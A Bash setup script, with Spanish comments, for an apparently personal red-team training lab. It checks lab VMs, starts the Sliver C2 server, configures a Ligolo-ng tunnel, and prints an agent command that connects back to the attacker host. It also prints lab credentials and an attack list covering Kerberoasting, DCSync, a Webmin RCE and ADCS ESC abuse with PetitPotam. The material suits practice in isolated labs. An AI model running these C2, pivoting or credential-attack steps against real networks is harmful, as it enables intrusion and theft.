#!/bin/bash
# ============================================================
#  RED TEAM OPS ROADMAP — Lab Start Script
#  Autor: Adrián Camacho
#  Uso: ./lab_start.sh [lab-number]
#  Ejemplo: ./lab_start.sh 01
#           ./lab_start.sh 02
#           ./lab_start.sh 03
#
#  Configura el entorno de Kali para el lab especificado:
#    - Verifica IPs de las VMs del lab
#    - Recrea interfaz Ligolo-ng (si aplica)
#    - Arranca Sliver C2
#    - Muestra estado del entorno
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

ok()      { echo -e "    ${GREEN}[+]${NC} $1"; }
info()    { echo -e "    ${YELLOW}[*]${NC} $1"; }
err()     { echo -e "    ${RED}[!]${NC} $1"; }
section() { echo -e "\n${CYAN}[*] $1${NC}"; }

LAB=${1:-"01"}

banner() {
    echo ""
    echo -e "${CYAN}============================================================${NC}"
    echo -e "${CYAN}  RED TEAM OPS ROADMAP — Lab Start${NC}"
    echo -e "${CYAN}  Lab: ${LAB} | $(date '+%Y-%m-%d %H:%M')${NC}"
    echo -e "${CYAN}============================================================${NC}"
    echo ""
}

# ─────────────────────────────────────────────────────────────
# Configuración por lab
# ─────────────────────────────────────────────────────────────
lab_config() {
    case $LAB in
        "01")
            LAB_NAME="GHOST FOREST — Attacktive Directory (APT29)"
            TARGETS=("10.0.2.10:DC-01" "10.0.2.8:WKSTN-01")
            NEEDS_LIGOLO=false
            SLIVER_LISTENER="https"
            SLIVER_PORT=443
            ;;
        "02")
            LAB_NAME="SILENT BRIDGE — Wreath (APT41)"
            TARGETS=("10.0.2.200:PROD" "10.0.3.150:GIT" "10.0.3.7:PC-01")
            NEEDS_LIGOLO=true
            LIGOLO_NETWORK="10.0.3.0/24"
            SLIVER_LISTENER="https"
            SLIVER_PORT=443
            ;;
        "03")
            LAB_NAME="DARK GATE — ADCS Abuse (APT29)"
            TARGETS=("10.0.2.10:DC-01")
            NEEDS_LIGOLO=false
            SLIVER_LISTENER="https"
            SLIVER_PORT=443
            ;;
        *)
            err "Lab no reconocido: $LAB"
            echo "    Labs disponibles: 01, 02, 03"
            exit 1
            ;;
    esac
}

# ─────────────────────────────────────────────────────────────
# Verificar conectividad con targets
# ─────────────────────────────────────────────────────────────
check_targets() {
    section "Verificando conectividad con targets..."
    local all_ok=true

    for target in "${TARGETS[@]}"; do
        IP="${target%%:*}"
        NAME="${target##*:}"
        if nmap -sn -n --unprivileged "$IP" 2>/dev/null | grep -q "Host is up"; then
            ok "$NAME ($IP) — accesible ✅"
        else
            err "$NAME ($IP) — NO responde ❌ — ¿VM encendida?"
            all_ok=false
        fi
    done

    if [ "$all_ok" = false ]; then
        echo ""
        echo -e "    ${YELLOW}Enciende las VMs necesarias en VirtualBox y vuelve a ejecutar${NC}"
    fi
}

# ─────────────────────────────────────────────────────────────
# Configurar Ligolo-ng (Lab-02 y labs con pivoting)
# ─────────────────────────────────────────────────────────────
setup_ligolo() {
    if [ "$NEEDS_LIGOLO" = true ]; then
        section "Configurando Ligolo-ng..."

        # Verificar que el binario existe
        if [ ! -f "/opt/ligolo/proxy" ]; then
            err "Ligolo-ng no encontrado en /opt/ligolo/ — ejecuta arsenal_setup.sh primero"
            return
        fi

        # Crear interfaz tun si no existe
        if ! ip link show ligolo &>/dev/null; then
            sudo ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null
            sudo ip link set ligolo up
            ok "Interfaz ligolo creada"
        else
            ok "Interfaz ligolo ya existe"
        fi

        # Añadir ruta si no existe
        if ! ip route | grep -q "$LIGOLO_NETWORK"; then
            sudo ip route add "$LIGOLO_NETWORK" dev ligolo 2>/dev/null
            ok "Ruta $LIGOLO_NETWORK añadida via ligolo"
        else
            ok "Ruta $LIGOLO_NETWORK ya existe"
        fi

        echo ""
        info "Para activar el túnel:"
        echo -e "      ${CYAN}/opt/ligolo/proxy -selfcert -laddr 0.0.0.0:11601${NC}"
        info "Luego en PROD ejecutar el agent:"
        echo -e "      ${CYAN}/tmp/agent -connect 10.0.2.9:11601 -ignore-cert &${NC}"
    fi
}

# ─────────────────────────────────────────────────────────────
# Arrancar Sliver C2
# ─────────────────────────────────────────────────────────────
setup_sliver() {
    section "Verificando Sliver C2..."

    if ! command -v sliver &>/dev/null; then
        err "Sliver no instalado — ejecuta arsenal_setup.sh primero"
        return
    fi

    if systemctl is-active --quiet sliver 2>/dev/null; then
        ok "Sliver ya está corriendo"
    else
        sudo systemctl start sliver 2>/dev/null
        sleep 2
        if systemctl is-active --quiet sliver 2>/dev/null; then
            ok "Sliver iniciado"
        else
            info "Sliver no como servicio — iniciando manualmente con 'sliver'"
        fi
    fi

    info "Listener HTTPS configurado → puerto $SLIVER_PORT"
    info "Para conectar: sliver"
}

# ─────────────────────────────────────────────────────────────
# Verificar herramientas críticas del lab
# ─────────────────────────────────────────────────────────────
check_tools() {
    section "Verificando herramientas..."

    # Herramientas comunes
    common_tools=("nmap" "evil-winrm" "nxc" "impacket-secretsdump")
    for tool in "${common_tools[@]}"; do
        if command -v "$tool" &>/dev/null; then
            ok "$tool ✅"
        else
            err "$tool ❌"
        fi
    done

    # Herramientas específicas por lab
    case $LAB in
        "02")
            if [ -f "/opt/ligolo/proxy" ]; then
                ok "ligolo-ng proxy ✅"
            else
                err "ligolo-ng proxy ❌"
            fi
            ;;
        "03")
            if command -v certipy-ad &>/dev/null; then
                ok "certipy-ad ✅"
            else
                err "certipy-ad ❌"
            fi
            if [ -f "/opt/redteam/PetitPotam.py" ]; then
                ok "PetitPotam ✅"
            else
                err "PetitPotam ❌ → descarga: curl -o /opt/redteam/PetitPotam.py https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py"
            fi
            ;;
    esac
}

# ─────────────────────────────────────────────────────────────
# Resumen final
# ─────────────────────────────────────────────────────────────
summary() {
    echo ""
    echo -e "${CYAN}============================================================${NC}"
    echo -e "${CYAN}  Entorno listo — $LAB_NAME${NC}"
    echo -e "${CYAN}============================================================${NC}"
    echo ""

    case $LAB in
        "01")
            echo -e "  ${YELLOW}Credenciales de entrada:${NC}"
            echo -e "    ceo.martinez : Direccion2024!"
            echo -e "    backup_svc   : Backup2024!"
            echo ""
            echo -e "  ${YELLOW}Vectores principales:${NC}"
            echo -e "    AS-REP Roasting → ceo.martinez"
            echo -e "    Kerberoasting   → backup_svc"
            echo -e "    DCSync          → ceo.martinez"
            ;;
        "02")
            echo -e "  ${YELLOW}Topología:${NC}"
            echo -e "    Kali(10.0.2.9) → PROD(10.0.2.200) → GIT(10.0.3.150) → PC-01(10.0.3.7)"
            echo ""
            echo -e "  ${YELLOW}Vector de entrada:${NC}"
            echo -e "    CVE-2019-12840 → python3 /tmp/webmin_rce.py"
            echo -e "    Credenciales Git: thomas:iamthegreatest"
            ;;
        "03")
            echo -e "  ${YELLOW}CA objetivo:${NC} AtackCorp-CA @ 10.0.2.10"
            echo ""
            echo -e "  ${YELLOW}Vectores ADCS:${NC}"
            echo -e "    ESC1 → certipy-ad req -upn Administrador@atackcorp.local"
            echo -e "    ESC4 → fin.garcia:Finance2024! (GenericWrite)"
            echo -e "    ESC8 → impacket-ntlmrelayx + PetitPotam"
            ;;
    esac
    echo ""
}

# ─────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────
banner
lab_config
check_targets
setup_ligolo
setup_sliver
check_tools
summary
